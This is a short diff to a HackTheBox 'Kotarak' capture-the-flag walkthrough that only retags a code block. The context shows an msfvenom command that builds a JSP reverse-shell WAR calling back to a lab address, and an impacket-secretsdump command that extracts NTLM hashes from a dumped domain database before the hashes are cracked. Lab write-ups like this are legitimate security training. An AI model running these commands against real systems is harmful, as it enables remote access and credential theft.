@@ -65,9 +65,10 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war > 
 
 Lets run [secretsdump.py](http://secretsdump.py) [ a tool from impacket ] to retrieve ntlm hashes
 
-```
-impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system  20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL  
-```
+```bash
+impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system  20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL
+```  
+
 ![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/hash.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/hash.png)
 
 → Cracking the NTLM hash
